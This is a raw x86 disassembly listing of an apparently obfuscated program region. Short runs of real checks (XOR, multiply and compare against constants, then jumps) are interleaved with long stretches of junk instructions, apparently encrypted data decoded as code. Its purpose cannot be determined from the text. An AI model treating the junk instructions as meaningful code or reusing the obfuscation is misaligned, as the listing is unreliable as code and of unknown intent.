  40193a:	in     al,dx
  40193b:	sbb    DWORD PTR ds:0x1f0b8512,ecx
  401941:	xor    al,0xd8
  401943:	into   
  401944:	mov    bl,BYTE PTR [edi]
  401946:	(bad)  
  401947:	dec    DWORD PTR [edx]
  401949:	fs push esi
  40194b:	leave  
  40194c:	mov    DWORD PTR [ebp-0x1c],eax
  40194f:	mov    eax,DWORD PTR [ebp-0x1c]
  401952:	mov    DWORD PTR [eax],0xf89f2da9
  401958:	mov    eax,DWORD PTR [ebp-0x14]
  40195b:	mov    ebx,DWORD PTR [ebp-0x8]
  40195e:	xor    eax,ecx
  401960:	xor    ebx,ecx
  401962:	xor    edx,edx
  401964:	add    eax,esi
  401966:	add    ebx,esi
  401968:	div    ebx
  40196a:	mov    edx,DWORD PTR [ebp-0x2c]
  40196d:	cmp    eax,DWORD PTR [edx]
  40196f:	je     0x40271e
  401975:	mov    DWORD PTR [ebp-0xc],0x705fd8f
  40197c:	lea    eax,[ebp-0xc]
  40197f:	mov    DWORD PTR [ebp-0x10],eax
  401982:	jmp    0x401b9f
  401987:	int3   
  401988:	sub    eax,0xbde9be20
  40198d:	push   0xffffffa9
  40198f:	mov    ebp,0xc7bf628
  401994:	repnz mov ds:0x707a70c7,al
  40199a:	jo     0x401a0c
  40199c:	jle    0x401a0e
  40199e:	jo     0x401985
  4019a0:	cmc    
  4019a1:	inc    esp
  4019a2:	pop    ebp
  4019a3:	(bad)  
  4019a4:	outs   dx,BYTE PTR ds:[esi]
  4019a5:	cmp    eax,DWORD PTR [eax+0x4d]
  4019a8:	push   ecx
  4019a9:	mov    edx,0x73979384
  4019ae:	and    al,0x72
  4019b0:	xor    ch,BYTE PTR [ecx+0x39de0b60]
  4019b6:	test   eax,0x7908af18
  4019bb:	adc    eax,0x9db3dbe
  4019c0:	sub    bl,cl
  4019c2:	or     eax,0x2793fa64
  4019c7:	jae    0x401a32
  4019c9:	inc    ebp
  4019ca:	clc    
  4019cb:	test   BYTE PTR [esi-0x25edb92f],0x91
  4019d2:	xchg   ebx,eax
  4019d3:	out    dx,eax
  4019d4:	and    ah,BYTE PTR [edx]
  4019d6:	shl    BYTE PTR [edi],0x2
  4019d9:	into   
  4019da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4019db:	enter  0x3403,0xea
  4019df:	ror    edi,cl
  4019e1:	add    ecx,edi
  4019e3:	stos   DWORD PTR es:[edi],eax
  4019e4:	data16 sub al,0xf5
  4019e7:	lods   eax,DWORD PTR ds:[esi]
  4019e8:	icebp  
  4019e9:	test   BYTE PTR [ecx-0x6d],cl
  4019ec:	lock mov ch,0x23
  4019ef:	mov    esi,0x715c2bef
  4019f4:	mov    gs,edi
  4019f6:	(bad)  
  4019f8:	leave  
  4019f9:	jecxz  0x401a34
  4019fb:	iret   
  4019fc:	or     al,0xc8
  4019fe:	es inc esi
  401a00:	or     BYTE PTR [ecx+0x57fa77cd],0x5c
  401a07:	xlat   BYTE PTR ds:[ebx]
  401a08:	es loope 0x4019f3
  401a0b:	jo     0x401990
  401a0d:	ror    edi,cl
  401a0f:	lods   al,BYTE PTR ds:[esi]
  401a10:	retf   0x7263
  401a13:	sbb    al,0x25
  401a15:	xchg   ebx,eax
  401a16:	prefetcht1 BYTE PTR [ecx]
  401a19:	and    eax,0xfa8c97c7
  401a1e:	xchg   edi,eax
  401a1f:	sub    eax,0x57b2e1ef
  401a24:	fisttp QWORD PTR [edi+0x7a]
  401a27:	jo     0x4019cb
  401a29:	push   ecx
  401a2a:	cmp    DWORD PTR [edi],ebp
  401a2c:	shr    BYTE PTR [ebx],0x7c
  401a2f:	or     BYTE PTR [ecx+0x67],al
  401a32:	std    
  401a33:	mov    ebp,0x4c1c3b23
  401a38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401a39:	fdiv   st,st(7)
  401a3b:	add    al,0x80
  401a3d:	sti    
  401a3e:	mov    eax,0xf5041cd7
  401a43:	xchg   edi,eax
  401a44:	xor    esp,esp
  401a46:	push   eax
  401a47:	retf   
  401a48:	pop    esi
  401a49:	nop
  401a4a:	fisttp WORD PTR [edx]
  401a4c:	push   0xa8073a61
  401a51:	rol    BYTE PTR [edi-0x53],cl
  401a54:	fisub  DWORD PTR [edi+0xc]
  401a57:	push   esp
  401a58:	jmp    0xcb88:0x289ce347
  401a5f:	ins    BYTE PTR es:[edi],dx
  401a60:	mov    esp,0x2085eebc
  401a65:	or     eax,0x9d07da8
  401a6a:	aam    0x7c
  401a6c:	xchg   edi,eax
  401a6d:	cmp    eax,0x1c8a1f4d
  401a72:	rcl    BYTE PTR ds:0x15e4e07c,1
  401a78:	retf   
  401a79:	pop    edi
  401a7a:	cmp    ah,ch
  401a7c:	rcl    edi,1
  401a7e:	push   edx
  401a7f:	inc    edi
  401a80:	xor    eax,0xe86cea47
  401a85:	loope  0x401ac1
  401a87:	imul   esi,DWORD PTR [ebx-0x65],0xffffffb6
  401a8b:	sub    DWORD PTR [ebp+eiz*4-0x5d],edi
  401a8f:	pop    esp
  401a90:	adc    ebx,DWORD PTR [edi+0x50d7bdac]
  401a96:	lods   eax,DWORD PTR ds:[esi]
  401a97:	rcr    DWORD PTR [edi-0x22c7d046],1
  401a9d:	test   cl,0x69
  401aa0:	(bad)  
  401aa1:	out    dx,eax
  401aa2:	pushf  
  401aa3:	dec    esp
  401aa4:	sbb    eax,0x6b9ce0c0
  401aa9:	sbb    ebx,edx
  401aab:	arpl   bp,si
  401aad:	or     eax,0x49faba86
  401ab2:	xchg   ebp,eax
  401ab3:	and    eax,DWORD PTR [edx-0x56]
  401ab6:	pop    edx
  401ab7:	fstp   DWORD PTR [eax]
  401ab9:	(bad)  
  401aba:	mov    eax,0xbad34f25
  401abf:	and    DWORD PTR [edx],ebp
  401ac1:	pusha  
  401ac2:	outs   dx,DWORD PTR cs:[esi]
  401ac4:	(bad)  
  401ac5:	sbb    BYTE PTR [edi+0xa],dh
  401ac8:	jl     0x401a77
  401aca:	xchg   ebp,eax
  401acb:	lea    ebp,[ebp-0x61d59d48]
  401ad1:	and    eax,DWORD PTR [ecx]
  401ad3:	inc    edi
  401ad4:	and    eax,0x8f54a061
  401ad9:	push   esp
  401ada:	leave  
  401adb:	or     edi,DWORD PTR [esi-0x17]
  401ade:	mov    al,ds:0xfcab1905
  401ae3:	(bad)  
  401ae4:	mov    BYTE PTR fs:[ecx-0x3200a72b],bl
  401aeb:	or     al,0x2f
  401aed:	xor    bh,ch
  401aef:	and    dl,BYTE PTR ds:0xee708a
  401af5:	ffreep st(5)
  401af7:	and    eax,0x2bc62c13
  401afc:	mov    ecx,eax
  401afe:	outs   dx,DWORD PTR ds:[esi]
  401aff:	lahf   
  401b00:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b01:	fcomp  QWORD PTR [ebx-0x72dd0c3b]
  401b07:	cwde   
  401b08:	mul    BYTE PTR [esi+0x5ec7b07e]
  401b0e:	jae    0x401b2a
  401b10:	fwait
  401b11:	mov    esp,0x447955f6
  401b16:	mov    ebx,0xf62bd1a5
  401b1b:	in     al,dx
  401b1c:	std    
  401b1d:	mov    DWORD PTR [ebp-0x6a0bbc0],esi
  401b23:	push   0xffffff9f
  401b25:	inc    eax
  401b26:	add    BYTE PTR [ecx+0xe],dl
  401b29:	popa   
  401b2a:	mov    dl,0xef
  401b2c:	adc    bh,BYTE PTR cs:[edi]
  401b2f:	or     al,dh
  401b31:	into   
  401b32:	(bad)  
  401b33:	mov    cl,0x3e
  401b35:	push   ebp
  401b36:	(bad)  
  401b37:	fld    QWORD PTR [ebx+0x354379af]
  401b3d:	adc    edi,esi
  401b3f:	ins    DWORD PTR es:[edi],dx
  401b40:	jbe    0x401acb
  401b42:	ja     0x401b83
  401b44:	rcr    DWORD PTR [esi+0x32],1
  401b47:	sub    al,0xc5
  401b49:	ret    0xa847
  401b4c:	std    
  401b4d:	push   cs
  401b4e:	test   al,0x2c
  401b50:	sbb    esi,DWORD PTR [esi]
  401b52:	add    DWORD PTR [edi+0x2b],edi
  401b55:	pop    eax
  401b56:	xor    eax,0x8c953c23
  401b5b:	call   0x1f4e:0x4d1077c
  401b62:	xchg   edx,eax
  401b63:	or     DWORD PTR [eax+0x39ab86dc],0x44
  401b6a:	loopne 0x401b2e
  401b6c:	sbb    DWORD PTR fs:[eax+0x29],esi
  401b70:	clc    
  401b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b72:	addr16 jmp 0x401b95
  401b75:	xchg   BYTE PTR [ebp+0x545537c5],bl
  401b7b:	jg     0x401bb7
  401b7d:	or     DWORD PTR [ecx-0x13621636],edi
  401b83:	aam    0xe3
  401b85:	sbb    DWORD PTR [ebx],edi
  401b87:	sbb    al,bh
  401b89:	mov    ds:0x1f99a220,al
  401b8e:	cld    
  401b8f:	push   edx
  401b90:	fistp  QWORD PTR [edi+0x64d13c1a]
  401b96:	inc    ebx
  401b97:	mov    esp,0x425b117b
  401b9c:	scas   al,BYTE PTR es:[edi]
  401b9d:	fnstcw WORD PTR [ebx]
  401b9f:	mov    eax,DWORD PTR [ebp-0x10]
  401ba2:	mov    edx,DWORD PTR [eax]
  401ba4:	imul   edx,edx,0xf89ea9ec
  401baa:	mov    DWORD PTR [eax],edx
  401bac:	mov    eax,DWORD PTR [ebp-0xc]
  401baf:	cmp    eax,0x742b26d4
  401bb4:	je     0x401bc8
  401bba:	mov    eax,DWORD PTR [ebp-0x1c]
  401bbd:	or     DWORD PTR [eax],0x60751c9c
  401bc3:	jmp    0x40272d
  401bc8:	mov    eax,DWORD PTR [ebp-0xc]
  401bcb:	jmp    0x401de8
  401bd0:	popa   
  401bd1:	ja     0x401bca
  401bd3:	add    esi,ecx
  401bd5:	xor    DWORD PTR [ecx+0x75],0xffffffde
  401bd9:	adc    al,0xb4
  401bdb:	mov    dl,BYTE PTR [esi+ebp*2]
  401bde:	jp     0x401b85
  401be0:	jo     0x401c5a
  401be2:	jo     0x401c54
  401be4:	jo     0x401c64
  401be6:	jo     0x401c58
  401be8:	or     eax,DWORD PTR [ebx-0x19f723df]
  401bee:	cmc    
  401bef:	pop    edx
  401bf0:	loop   0x401bd6
  401bf2:	inc    edi
  401bf3:	rcl    BYTE PTR [ebp+0x26616e1b],0xfa
  401bfa:	dec    ebx
  401bfb:	add    esi,DWORD PTR [edi-0x248776b9]
  401c01:	push   esi
  401c02:	das    
  401c03:	and    eax,0xddd10b
  401c08:	(bad)  
  401c09:	jae    0x401c47
  401c0b:	(bad)  [ecx]
  401c0d:	push   ds
  401c0e:	or     ah,BYTE PTR [ebx]
  401c10:	xor    esp,DWORD PTR [ebp+0x31b321ee]
  401c16:	repnz fdiv DWORD PTR [ebx-0x6a3ae85a]
  401c1d:	xchg   edx,eax
  401c1e:	inc    ecx
  401c1f:	add    eax,0xe077d46c
  401c24:	pop    ebp
  401c25:	outs   dx,DWORD PTR ds:[esi]
  401c26:	jns    0x401c32
  401c28:	aad    0xa2
  401c2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401c2b:	mov    edi,0xb6ebe2e1
  401c30:	stos   BYTE PTR es:[edi],al
  401c31:	aas    
  401c32:	xchg   edi,eax
  401c33:	enter  0x6cfb,0xaa
  401c37:	xchg   esp,eax
  401c38:	add    dh,BYTE PTR [ecx+ecx*4-0x366fd134]
  401c3f:	int    0xe0
  401c41:	sbb    DWORD PTR [ebp+0x1477f334],esp
  401c47:	add    BYTE PTR [esi+0x29e2d81d],ah
  401c4d:	pop    edx
  401c4e:	jecxz  0x401c24
  401c50:	cmp    ah,BYTE PTR [ebp+0xe769a49]
  401c56:	push   ecx
  401c57:	jmp    0x401c27
  401c59:	mov    ds:0x359a39f1,al
  401c5e:	popf   
  401c5f:	jmp    0x401bfc
  401c61:	jbe    0x401c09
  401c63:	jge    0x401c65
  401c65:	adc    eax,0x8c1709a8
  401c6a:	cmp    DWORD PTR [eax],esp
  401c6c:	jne    0x401bf7
  401c6e:	sti    
  401c6f:	loop   0x401c3a
  401c71:	or     esi,esp
  401c73:	xchg   ebp,eax
  401c74:	push   ecx
  401c75:	lahf   
  401c76:	cmc    
  401c77:	sbb    eax,0xffd6eba0
  401c7c:	clc    
  401c7d:	inc    esi
  401c7e:	enter  0x8f5,0x69
  401c82:	out    0xbc,eax
  401c84:	outs   dx,DWORD PTR ds:[esi]
  401c85:	pop    esi
  401c86:	add    BYTE PTR [edi],dl
  401c88:	fcmovnbe st,st(3)
  401c8a:	or     edi,DWORD PTR [eax]
  401c8c:	sbb    edx,DWORD PTR [ebp-0xa]
  401c8f:	adc    dh,bl
  401c91:	loopne 0x401c27
  401c93:	repz mov esp,0xc70bfb6c
  401c99:	gs and al,0xe4
  401c9c:	dec    ebp
  401c9d:	rcr    ebx,1
  401c9f:	retf   0xae6d
  401ca2:	pusha  
  401ca3:	dec    esi
  401ca4:	pop    ds
  401ca5:	jl     0x401cea
  401ca7:	xor    ah,BYTE PTR [ecx-0x1c]
  401caa:	mov    WORD PTR [edx-0x7a93ac2],ss
  401cb0:	ja     0x401c7d
  401cb2:	pop    ebx
  401cb3:	loope  0x401c92
  401cb5:	sub    DWORD PTR [ebp-0x38],esp
  401cb8:	and    eax,0x93b04227
  401cbd:	pop    ecx
  401cbe:	imul   esp,DWORD PTR [ebp+0xf6d9e1c],0x39
  401cc5:	mov    DWORD PTR [eax],0x8e0a4335
  401ccb:	adc    al,0xe0
  401ccd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401cce:	cmp    al,0xe7
  401cd0:	jp     0x401ccb
  401cd2:	mov    ah,0x5b
  401cd4:	jge    0x401c9f
  401cd6:	mov    edi,0x4f08896a
  401cdb:	adc    al,0xb7
  401cdd:	add    eax,0xbf2cb456
  401ce2:	and    al,0xe0
  401ce4:	aad    0x9b
  401ce6:	xchg   esi,eax
  401ce7:	jne    0x401cff
  401ce9:	dec    esp
  401cea:	push   es
  401ceb:	lods   eax,DWORD PTR ds:[esi]
  401cec:	shr    DWORD PTR [esi-0x3a],cl
  401cef:	dec    eax
  401cf0:	or     esi,esp
  401cf2:	nop
  401cf3:	sbb    eax,0x55d563b9
  401cf8:	sub    al,0xb0
  401cfa:	adc    BYTE PTR [eax],al
  401cfc:	gs or  eax,0xa4319f8d
  401d02:	(bad)  
  401d04:	inc    ecx
  401d05:	xchg   esi,eax
  401d06:	pop    eax
  401d07:	cs pop esp
  401d09:	das    
  401d0a:	mov    esi,0xe3e7ce6b
  401d0f:	mov    cl,0xdc
  401d11:	mov    bl,0xb
  401d13:	sti    
  401d14:	loop   0x401d95
  401d16:	or     esi,DWORD PTR [ebx-0x44d9909d]
  401d1c:	mov    bh,0xc5
  401d1e:	fucomi st,st(7)
  401d20:	lahf   
  401d21:	repz imul ebp,DWORD PTR es:[esi+0x58fd5cdd],0xffffffd6
  401d2a:	or     cl,BYTE PTR [esi-0x703b34db]
  401d30:	loop   0x401d89
  401d32:	jno    0x401cca
  401d34:	pop    ebp
  401d35:	dec    ebp
  401d36:	ss push es
  401d38:	aas    
  401d39:	jmp    0x2012353b
  401d3e:	jg     0x401cd8
  401d40:	add    al,0x5f
  401d42:	and    DWORD PTR [ecx-0x22439f87],esp
  401d48:	icebp  
  401d49:	out    0x89,al
  401d4b:	popa   
  401d4c:	add    eax,0x97d5bbd1
  401d51:	pop    ebp
  401d52:	and    ah,dh
  401d54:	call   0xb2759c23
  401d59:	xchg   edx,eax
  401d5a:	push   esp
  401d5b:	xchg   edx,eax
  401d5c:	push   cs
  401d5d:	sub    eax,0x546e890c
  401d62:	lahf   
  401d63:	enter  0xff11,0x81
  401d67:	fistp  WORD PTR [ebx+0x53983c21]
  401d6d:	and    DWORD PTR [ebx-0xccb9094],edx
  401d73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d74:	jo     0x401d4f
  401d76:	sbb    eax,0x7f2aa440
  401d7b:	enter  0x50f8,0x27
  401d7f:	add    esi,DWORD PTR [ebx]
  401d81:	out    0x11,al
  401d83:	(bad)  [edx]
  401d86:	mov    dh,0xfa
  401d88:	sbb    ebp,DWORD PTR [edi-0x34e85ff]
  401d8e:	stc    
  401d8f:	adc    eax,0xb147e627
  401d94:	xchg   ebx,eax
  401d95:	out    0xdd,eax
  401d97:	dec    edx
  401d98:	int3   
  401d99:	cmc    
  401d9a:	enter  0x8acc,0x4e
  401d9e:	xchg   esp,eax
  401d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401da0:	jmp    0x1c3d:0x5a303005
  401da7:	stos   BYTE PTR es:[edi],al
  401da8:	fwait
  401da9:	stc    
  401daa:	ret    
  401dab:	inc    ax
  401dad:	sub    BYTE PTR [edx-0x62],dh
  401db0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401db1:	lahf   
  401db2:	dec    ebp
  401db3:	call   0xda8aa9cc
  401db8:	sub    bh,BYTE PTR [edi]
  401dba:	jno    0x401d61
  401dbc:	out    0xa3,eax
  401dbe:	retf   0x7824
  401dc1:	loope  0x401d8c
  401dc3:	stos   BYTE PTR es:[di],al
  401dc5:	fstp   TBYTE PTR [edi-0x1e47a6b1]
  401dcb:	sbb    ecx,edx
  401dcd:	fwait
  401dce:	ins    BYTE PTR es:[edi],dx
  401dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401dd0:	nop
  401dd1:	bound  esp,QWORD PTR [ebx-0x31]
  401dd4:	sub    eax,0xd8b0774
  401dd9:	mov    bh,0x2d
  401ddb:	mov    ds:0xd55e15e5,eax
  401de0:	imul   edi,esp,0x1b
  401de3:	push   ebp
  401de4:	or     al,0xe
  401de6:	shl    esi,cl
  401de8:	add    eax,DWORD PTR [ebp-0x18]
  401deb:	cmp    eax,0x6cca547d
  401df0:	je     0x401e04
  401df6:	mov    eax,DWORD PTR [ebp-0x10]
  401df9:	and    DWORD PTR [eax],0x751c99
  401dff:	jmp    0x40272d
  401e04:	mov    eax,DWORD PTR [ebp-0xc]
  401e07:	mov    edx,DWORD PTR [ebp-0x18]
  401e0a:	or     eax,edx
  401e0c:	cmp    eax,0xfcbf2ffd
  401e11:	je     0x401e25
  401e17:	mov    eax,DWORD PTR [ebp-0x10]
  401e1a:	xor    DWORD PTR [eax],0x2650fa8f
  401e20:	jmp    0x40272d
  401e25:	mov    ax,WORD PTR [ebp-0x4]
  401e29:	mov    edx,0x8a3e
  401e2e:	xor    ax,dx
  401e31:	jmp    0x40204e
  401e36:	cld    
  401e37:	test   BYTE PTR [edx+0x3d],ch
  401e3a:	jb     0x401e31
  401e3c:	stos   DWORD PTR es:[edi],eax
  401e3d:	inc    ecx
  401e3e:	inc    eax
  401e3f:	(bad)  
  401e40:	cmp    BYTE PTR [esp+eiz*8-0x2d],dl
  401e44:	mov    ds:0x70067035,al
  401e49:	jo     0x401ebb
  401e4b:	jle    0x401ebd
  401e4d:	jo     0x401dea
  401e4f:	dec    esi
  401e50:	loop   0x401ead
  401e52:	retf   0x35dd
  401e55:	xchg   edi,eax
  401e56:	in     al,0xd8
  401e58:	mov    edx,DWORD PTR [edi+0x42]
  401e5b:	sti    
  401e5c:	aaa    
  401e5d:	shl    BYTE PTR [edx],cl
  401e5f:	inc    eax
  401e60:	popf   
  401e61:	push   cs
  401e62:	dec    edi
  401e63:	pop    eax
  401e64:	enter  0x706,0xc7
  401e68:	retf   0x9a91
  401e6b:	adc    ebp,DWORD PTR [ebx+edx*1]
  401e6e:	aaa    
  401e6f:	stc    
  401e70:	or     ebp,ebp
  401e72:	or     ch,BYTE PTR [eax-0x29c78aa3]
  401e78:	add    bl,BYTE PTR [edx+0x1c]
  401e7b:	sub    al,0xf4
  401e7d:	cmp    edi,DWORD PTR [ecx+0x4bef3b5]
  401e83:	addr16 std 
  401e85:	stos   BYTE PTR es:[edi],al
  401e86:	mov    ah,0x44
  401e88:	sahf   
  401e89:	jne    0x401eca
  401e8b:	in     eax,dx
  401e8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e8d:	shl    BYTE PTR [ecx+edi*8],0x1b
  401e91:	(bad)  
  401e92:	mov    bh,0x23
  401e94:	xchg   edx,eax
  401e95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401e96:	jl     0x401f0e
  401e98:	adc    al,0x3b
  401e9a:	add    cl,BYTE PTR [edx]
  401e9c:	scas   eax,DWORD PTR es:[edi]
  401e9d:	js     0x401e4d
  401e9f:	push   esp
  401ea0:	jl     0x401ee2
  401ea2:	aam    0xcf
  401ea4:	cld    
  401ea5:	pop    es
  401ea6:	dec    ebx
  401ea7:	and    esp,0xffeb5ee
  401ead:	or     ebp,DWORD PTR [edx-0x2a]
  401eb0:	xor    BYTE PTR [eax-0x42da624c],al
  401eb6:	shr    ebx,cl
  401eb8:	inc    ecx
  401eb9:	mov    BYTE PTR [ebx-0x8],bl
  401ebc:	out    dx,eax
  401ebd:	stos   DWORD PTR es:[edi],eax
  401ebe:	push   0x51
  401ec0:	fist   WORD PTR ds:0x29abea36
  401ec6:	les    ebp,FWORD PTR [edi+0xd94fe87]
  401ecc:	mov    dl,0xd2
  401ece:	out    dx,al
  401ecf:	inc    esi
  401ed0:	scas   al,BYTE PTR es:[edi]
  401ed1:	mov    al,0x14
  401ed3:	jmp    0x7b31:0xc65c7da3
  401eda:	xchg   ebp,eax
  401edb:	sub    esi,DWORD PTR [esi]
  401edd:	and    edx,DWORD PTR [ebx]
  401edf:	in     eax,0xf8
  401ee1:	int3   
  401ee2:	int    0xef
  401ee4:	sub    eax,0xf8987b43
  401ee9:	dec    edx
  401eea:	xor    eax,0xbdf2aeb7
  401eef:	hlt    
  401ef0:	xchg   DWORD PTR [ebx],eax
  401ef2:	and    BYTE PTR [edx-0x4cd24b33],dh
  401ef8:	adc    edx,ebp
  401efa:	test   al,0x6f
  401efc:	mov    bl,0xb3
  401efe:	aas    
  401eff:	retf   
  401f00:	mov    cl,0x7a
  401f02:	push   esp
  401f03:	or     al,0x55
  401f05:	cmp    eax,0xc7a2dee7
  401f0a:	xchg   esi,eax
  401f0b:	cmp    BYTE PTR [ecx],bh
  401f0d:	xlat   BYTE PTR ds:[ebx]
  401f0e:	outs   dx,BYTE PTR ds:[esi]
  401f0f:	mov    al,ds:0xab0c5bca
  401f14:	test   BYTE PTR [ebx-0x28],dl
  401f17:	fs sahf 
  401f19:	mov    ah,0xca
  401f1b:	inc    ebp
  401f1c:	add    DWORD PTR [edi+eiz*2],0x87fdc048
  401f23:	cmp    BYTE PTR [eax],dl
  401f25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f26:	fild   DWORD PTR [esi]
  401f28:	ins    DWORD PTR es:[edi],dx
  401f29:	pop    es
  401f2a:	mov    esi,0x59ecb2bd
  401f2f:	pop    ebx
  401f30:	fwait
  401f31:	jmp    0x401f91
  401f33:	mov    ds:0x1bc4135,al
  401f38:	inc    edi
  401f39:	pop    edx
  401f3a:	cwde   
  401f3b:	cmps   BYTE PTR fs:[si],BYTE PTR es:[di]
  401f3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401f3f:	cmp    BYTE PTR [edi-0x43],bh
  401f42:	mov    esp,0xf2aad8d5
  401f47:	adc    DWORD PTR [edx-0x165abde1],edi
  401f4d:	or     ebx,DWORD PTR [eax]
  401f4f:	inc    ecx
  401f50:	cmp    bh,al
  401f52:	jl     0x401f6a
  401f54:	xchg   ebx,eax
  401f55:	jne    0x401f27
  401f57:	psrld  mm1,QWORD PTR [esi]
  401f5a:	mov    al,0xbb
  401f5c:	mov    al,0x7
  401f5e:	outs   dx,DWORD PTR ds:[esi]
  401f5f:	add    eax,0x56b28eef
  401f64:	inc    ebp
  401f65:	arpl   WORD PTR [ebx+0x43a7d583],ax
  401f6b:	push   edi
  401f6c:	xchg   edi,eax
  401f6d:	enter  0xdff2,0xd3
  401f71:	fs pop ds
  401f73:	add    eax,0x9280f0c
  401f78:	stos   BYTE PTR es:[edi],al
  401f79:	(bad)  
  401f7a:	fimul  WORD PTR [ebx+ecx*8-0x3c84b8df]
  401f81:	xchg   ecx,eax
  401f82:	adc    bh,bh
  401f84:	dec    ebp
  401f85:	dec    esi
  401f86:	or     BYTE PTR [ecx-0x35bd66d7],0x51
  401f8d:	jp     0x401f6d
  401f8f:	cmc    
  401f90:	mov    WORD PTR [eax],es
  401f92:	mov    ecx,0x340166f8
  401f97:	dec    ebp
  401f98:	sub    BYTE PTR [eax-0x3025720a],cl
  401f9e:	rcr    DWORD PTR [ebx+0x6c],1
  401fa1:	mov    al,0xe2
  401fa3:	sub    al,0x3
  401fa5:	jns    0x401f47
  401fa7:	dec    edi
  401fa8:	cs call 0x832af1db
  401fae:	nop
  401faf:	or     ecx,DWORD PTR [eax-0x54]
  401fb2:	fmul   DWORD PTR [eax+ebx*1]
  401fb5:	adc    cl,BYTE PTR [ecx]
  401fb7:	add    al,0xdf
  401fb9:	call   0xff3e:0x1d302989
  401fc0:	jge    0x401f52
  401fc2:	int    0x48
  401fc4:	sbb    bl,BYTE PTR ss:[ebp-0x41992a6b]
  401fcb:	int3   
  401fcc:	out    dx,eax
  401fcd:	fmul   QWORD PTR [edi+0x5d]
  401fd0:	and    eax,0x46377678
  401fd5:	clc    
  401fd6:	(bad)  
  401fd7:	call   0xdbbe:0xc75fd52a
  401fde:	adc    eax,0x5906340b
  401fe3:	sbb    cl,BYTE PTR [ebx]
  401fe5:	stc    
  401fe6:	cld    
  401fe7:	and    DWORD PTR [edx-0x11],ebp
  401fea:	sbb    eax,0xe6312062
  401fef:	cli    
  401ff0:	sahf   
  401ff1:	in     al,dx
  401ff2:	les    ecx,FWORD PTR [eax-0x515341aa]
  401ff8:	push   ds
  401ff9:	(bad)  
  401ffa:	inc    ebx
  401ffb:	push   ebp
  401ffc:	add    al,0xd3
  401ffe:	pop    esp
  401fff:	(bad)  
  402000:	lods   eax,DWORD PTR ds:[esi]
  402001:	sbb    al,0x9c
  402003:	aas    
  402004:	adc    eax,0xfe91bc2e
  402009:	jne    0x401f8e
  40200b:	pop    ecx
  40200c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40200d:	sar    DWORD PTR [edi+edi*4-0x393fbf43],cl
  402014:	adc    BYTE PTR [edx],bl
  402016:	mov    dl,BYTE PTR [esp+ecx*4]
  402019:	jle    0x40206f
  40201b:	sub    DWORD PTR [ebp-0x52],0x38
  40201f:	daa    
  402020:	call   0xc36595d7
  402025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402026:	add    esi,DWORD PTR ds:0x8999281b
  40202c:	adc    al,0x62
  40202e:	mov    al,0x16
  402030:	rcl    ecx,1
  402032:	fwait
  402033:	jmp    0x401fcb
  402035:	rcl    BYTE PTR [ebp-0x38],1
  402038:	xchg   edx,eax
  402039:	test   BYTE PTR [edi-0x6d2cb3d5],al
  40203f:	in     al,0xdd
  402041:	shl    BYTE PTR [esi-0x5cdf2b04],cl
  402047:	inc    edx
  402048:	rol    BYTE PTR [ebx],0x2d
  40204b:	xor    ecx,DWORD PTR [ebp-0x27aa7426]
  402051:	mov    edx,DWORD PTR [edx]
  402053:	add    ax,di
  402056:	cmp    ax,WORD PTR [edx]
  402059:	jmp    0x402276
  40205e:	ret    0x801a
  402061:	gs push 0xfb99f171
  402067:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402068:	ins    BYTE PTR es:[edi],dx
  402069:	adc    BYTE PTR [ebx+0x70370386],0x4
  402070:	jo     0x4020e2
  402072:	jo     0x4020f2
  402074:	jo     0x4020e6
  402076:	add    BYTE PTR [eax+0x148f7590],dh
  40207c:	mul    bh
  40207e:	clc    
  40207f:	out    dx,eax
  402080:	jnp    0x40201b
  402082:	mov    WORD PTR [edi+ebp*8],ds
  402085:	dec    edx
  402086:	sub    bh,BYTE PTR [ecx+0x14a8ee09]
  40208c:	xchg   edx,eax
  40208d:	mov    ecx,0xb05bd166
  402092:	jmp    0xc65a0d1e
  402097:	es adc ah,bh
  40209a:	jo     0x4020fd
  40209c:	jne    0x402102
  40209e:	iret   
  40209f:	cwde   
  4020a0:	rcl    DWORD PTR [eax+0x7875a8e5],cl
  4020a6:	cmova  ebp,DWORD PTR [edi+0x2e]
  4020aa:	int    0x32
  4020ac:	xchg   esp,eax
  4020ad:	(bad)
  4020b0:	test   DWORD PTR [edx-0x11],ebp
  4020b3:	and    BYTE PTR [ecx],bl
  4020b5:	sub    DWORD PTR [esi],0x7fdd6eb8
  4020bb:	iret   
  4020bc:	mov    BYTE PTR [esi],cl
  4020be:	mov    eax,0xa93dafdd
  4020c3:	xchg   DWORD PTR [edi],edi
  4020c5:	jmp    0xef51:0xa0b77473
  4020cc:	sar    dl,1
  4020ce:	sbb    DWORD PTR [ebx+edi*8+0x74],eax
  4020d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4020d3:	xor    al,0x2f
  4020d5:	(bad)  
  4020d7:	inc    eax
  4020d8:	out    dx,eax
  4020d9:	pop    esi
  4020da:	(bad)
  4020de:	pop    ecx
  4020df:	add    eax,0xa6f27164
  4020e4:	or     BYTE PTR [ebx-0x38f44e67],bl
  4020ea:	xchg   esi,eax
  4020eb:	mov    DWORD PTR [esp+esi*2],ebx
  4020ee:	outs   dx,DWORD PTR ds:[esi]
  4020ef:	pop    ebx
  4020f0:	daa    
  4020f1:	adc    eax,0x532e2781
  4020f6:	fdiv   DWORD PTR [ebx-0x41]
  4020f9:	mov    ch,0x1a
  4020fb:	mov    dh,0x9a
  4020fd:	adc    al,0xe1
  4020ff:	push   ebp
  402100:	aad    0x3c
  402102:	dec    edi
  402103:	call   0x77f78e65
  402108:	xlat   BYTE PTR ds:[ebx]
